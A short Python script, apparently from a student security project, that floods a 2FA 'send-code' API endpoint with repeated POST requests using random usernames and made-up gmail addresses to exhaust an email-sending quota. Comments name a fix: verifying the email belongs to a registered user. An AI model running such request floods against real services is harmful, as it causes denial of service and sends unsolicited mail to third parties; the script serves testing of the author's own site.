from wonderwords import RandomWord
import requests

#The purpose of this script is to overload the requests sent. Since resend is used, there is a limit on emails sent, 
# each account can be sent 15 times
# SOLUTION: Check if the email is a registered user before sending the email 


#change this number to send more requests
num_of_requests_to_send = 1

session = requests.Session()
url = "https://cse418-project-mirror.pages.dev/api/2fa/send-code"
headers = {"Content-Type": "application/json"}

for i in range(num_of_requests_to_send):
    r = RandomWord()
    word = r.word()

    for count in range(15):
        payload = {"userId": word, "email": f"{word}@gmail.com"}
        resp = session.post(url, json=payload, headers=headers)
        print(resp.status_code, resp.text[:200])
